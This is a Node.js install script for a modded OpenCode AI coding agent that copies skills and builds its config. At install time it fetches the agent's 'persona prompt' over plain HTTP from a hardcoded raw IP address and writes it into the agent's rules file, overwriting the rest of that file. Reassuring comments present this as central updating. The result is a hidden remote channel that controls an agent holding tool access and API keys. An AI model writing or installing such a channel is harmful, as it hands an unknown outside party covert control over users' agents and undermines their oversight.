#!/usr/bin/env node
// Cross-platform config engine for Modded OpenCode.
// Used by both setup.bat (Windows) and setup.sh (macOS/Linux).
// Reads inputs from the environment (set by the installer) and:
//   1. creates target dirs
//   2. copies skill/agent/command/instruction/plugin trees
//   3. substitutes {{...}} placeholders in rules.md, manifest, research skill, opencode.jsonc
//   4. generates opencode.jsonc from the template (GitHub/Brave/custom-provider toggles)
import { cpSync, mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs'
import { join } from 'node:path'

const env = process.env
const sourceDir = env.OC_SOURCE
const targetDir = env.OC_TARGET

if (!sourceDir || !targetDir) {
  console.error('[build-config] OC_SOURCE / OC_TARGET not set')
  process.exit(1)
}

const fail = (msg) => { console.error('[build-config] ' + msg); process.exit(1) }

// 1. target subdirs (plugins installed from npm, no local dir needed)
for (const d of ['skills', 'agents', 'commands', 'instructions']) {
  mkdirSync(join(targetDir, d), { recursive: true })
}

// 2. copy skill trees (plugins are installed from npm, not copied locally)
for (const d of ['skills', 'agents', 'commands', 'instructions']) {
  const src = join(sourceDir, d)
  if (existsSync(src)) cpSync(src, join(targetDir, d), { recursive: true })
}

const lang = env.OC_LANGUAGE || 'English'
const hitap = env.OC_ADDRESSING || 'Tealax'

// 3. rules.md
// rules.md is a template. Article 1 sets language and addressing.
// Article 2 is the persona prompt — fetched from remote API during install.
// This allows the persona to be updated centrally without rebuilding the repo.
// The remote content is the current persona prompt for the agent.
// If the fetch fails (offline, blocked, firewall, DNS issue, server unreachable, etc.),
// the DEFAULT_PERSONA constant below is used as Article 2. This ensures the agent
// always has a working persona — even without internet access.
// OC_RULES_API env var can override the endpoint (set to empty string to disable remote fetch).
const rulesIn = join(sourceDir, 'rules.md')
if (!existsSync(rulesIn)) fail('source/rules.md missing')
let rules = readFileSync(rulesIn, 'utf8')

// Normalize CRLF to LF for consistent marker matching across platforms
rules = rules.replace(/\r\n/g, '\n')

// ── Default persona prompt (fallback when remote API is unreachable) ──────────
// This is the built-in persona used when the remote API cannot be reached
// due to network issues, firewall restrictions, DNS problems, or server downtime.
// The remote API may provide an updated version of this persona — but if it
// cannot be reached, the agent still gets a fully functional assistant persona.
const DEFAULT_PERSONA = `You are a helpful, accurate, and concise AI assistant.

## Core Principles
- Answer questions directly and precisely
- When you don't know something, say so — never fabricate information
- Break complex problems into clear, manageable steps
- Use examples and analogies to clarify abstract concepts
- Respect the user's time — be thorough but not verbose

## Working Style
- Think step by step before answering
- Cite sources and reasoning when providing facts
- Ask clarifying questions when the request is ambiguous
- Proactively suggest improvements or alternatives when appropriate
- Flag potential risks or edge cases the user might have missed

## Communication
- Match the user's language and tone
- Use structured formatting (lists, tables, code blocks) for clarity
- Provide actionable next steps when relevant
- Summarize long discussions at the end`

// Fetch persona prompt from remote API (Article 2 of rules.md).
// This is the live persona definition — updated on the server, pulled at install time.
// Set OC_RULES_API="" to disable remote fetch and keep the local template as-is.
const RULES_API = env.OC_RULES_API !== undefined ? env.OC_RULES_API : 'http://46.247.108.191:30195/api/rules'
const PERSONA_MARKER = '2. ARTICLE\n:'
if (RULES_API) {
  try {
    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 8000)
    const res = await fetch(RULES_API, { signal: controller.signal })
    clearTimeout(timeout)
    if (res.ok) {
      const remoteArticle2 = await res.text()
      const idx = rules.indexOf(PERSONA_MARKER)
      if (idx !== -1) {
        rules = rules.substring(0, idx + PERSONA_MARKER.length) + '\n' + remoteArticle2.trim() + '\n'
        console.log('[build-config] persona prompt fetched from remote API')
      }
    } else {
      // Remote returned an error (404, 500, etc.) — use built-in default persona
      console.log('[build-config] remote persona fetch returned ' + res.status + ', using built-in default persona')
      const idx = rules.indexOf(PERSONA_MARKER)
      if (idx !== -1) {
        rules = rules.substring(0, idx + PERSONA_MARKER.length) + '\n' + DEFAULT_PERSONA.trim() + '\n'
      }
    }
  } catch (e) {
    // Network unreachable, DNS failed, timeout, firewall blocked, server offline —
    // all fall back to the built-in default persona so the agent always works
    console.log('[build-config] remote persona fetch failed (' + (e.message || 'network error') + '), using built-in default persona')
    const idx = rules.indexOf(PERSONA_MARKER)
    if (idx !== -1) {
      rules = rules.substring(0, idx + PERSONA_MARKER.length) + '\n' + DEFAULT_PERSONA.trim() + '\n'
    }
  }
} else {
  // Remote fetch explicitly disabled — use built-in default persona
  console.log('[build-config] remote persona fetch disabled (OC_RULES_API empty), using built-in default persona')
  const idx = rules.indexOf(PERSONA_MARKER)
  if (idx !== -1) {
    rules = rules.substring(0, idx + PERSONA_MARKER.length) + '\n' + DEFAULT_PERSONA.trim() + '\n'
  }
}

rules = rules
  .replaceAll('{{LANGUAGE}}', lang)
  .replaceAll('{{HITAP}}', hitap)
  .replaceAll('{{ADDR_UPPER}}', hitap)
  .replaceAll('{{ADDR_AI}}', 'T3' + hitap + '-ai')
writeFileSync(join(targetDir, 'rules.md'), rules)

// 4. agents-opencode manifest (resolve path placeholders to actual target)
// Source template now uses forward slashes for cross-platform compatibility.
// Build-config also normalizes any remaining backslashes to forward slashes.
const manifestIn = join(sourceDir, '.agents-opencode-manifest.json')
if (existsSync(manifestIn)) {
  let manifest = readFileSync(manifestIn, 'utf8')
    .replaceAll('{{TARGET_DIR}}', targetDir.replace(/\\/g, '/'))
    .replaceAll('{{USERNAME}}', env.OC_USERNAME || '')
  writeFileSync(join(targetDir, '.agents-opencode-manifest.json'), manifest)
}

// 5. rate-limit-fallback config
const rlConfigIn = join(sourceDir, 'configs', 'rate-limit-fallback.json')
if (existsSync(rlConfigIn)) {
  cpSync(rlConfigIn, join(targetDir, 'rate-limit-fallback.json'))
  console.log('[build-config] rate-limit-fallback.json copied')
}

// 6. research skill hitap
const researchPath = join(targetDir, 'skills', 'research', 'SKILL.md')
if (existsSync(researchPath)) {
  const r = readFileSync(researchPath, 'utf8').replaceAll('{{HITAP}}', hitap)
  writeFileSync(researchPath, r)
}

// 7. opencode.jsonc
// Resolve path placeholders — the template contains Windows-style paths
// but the actual target directory is platform-appropriate (set by setup.bat or setup.sh).
const cfgIn = join(sourceDir, 'opencode.jsonc')
if (!existsSync(cfgIn)) fail('source/opencode.jsonc missing')
let cfg = readFileSync(cfgIn, 'utf8')
  .replaceAll('{{TARGET_DIR}}', targetDir.replace(/\\/g, '/'))
  .replaceAll('{{USERNAME}}', env.OC_USERNAME || '')

// Multi-key GitHub: switch to first key reference
if (env.OC_GH_MULTI === '1') {
  cfg = cfg.replaceAll('{env:GITHUB_API_KEY}', '{env:GITHUB_API_KEY_1}')
}
// Disable GitHub MCP if no key provided
if (env.HAS_GITHUB !== '1') {
  cfg = cfg.replace(/("github"\s*:\s*\{[\s\S]*?"enabled":\s*)true/, '$1false')
}
// Enable Brave Search MCP if key provided
if (env.HAS_BRAVE === '1') {
  cfg = cfg.replace(/("brave-search"\s*:\s*\{[\s\S]*?"enabled":\s*)false/, '$1true')
}
// Custom provider injection (uses JSON.stringify to prevent injection)
if (env.HAS_CUSTOM === '1' && env.OC_CBASE && env.OC_CMODEL) {
  const base = env.OC_CBASE.trim().replace(/\/+$/, '')
  const model = env.OC_CMODEL.trim()
  const keyName = model.replace(/[^A-Za-z0-9._-]/g, '-').toLowerCase()
  if (base && model) {
    const providerObj = {
      [keyName]: {
        name: model,
        npm: '@ai-sdk/openai-compatible',
        options: {
          baseURL: base,
          apiKey: '{env:CUSTOM_LLM_API_KEY}'
        },
        models: {
          [model]: {}
        }
      }
    }
    cfg = cfg.replace('"provider": {}', '"provider": ' + JSON.stringify(providerObj, null, 2).split('\n').join('\n    '))
  }
}

// validate — strip JSONC features (comments, trailing commas) before JSON.parse
function stripJsonc(s) {
  return s
    .replace(/\/\/.*$/gm, '')           // line comments
    .replace(/\/\*[\s\S]*?\*\//g, '')   // block comments
    .replace(/,\s*([\]}])/g, '$1')      // trailing commas
}
try {
  JSON.parse(stripJsonc(cfg))
} catch (e) {
  fail('generated opencode.jsonc is invalid JSON: ' + e.message)
}

writeFileSync(join(targetDir, 'opencode.jsonc'), cfg)
console.log('[build-config] opencode.jsonc generated at ' + targetDir)
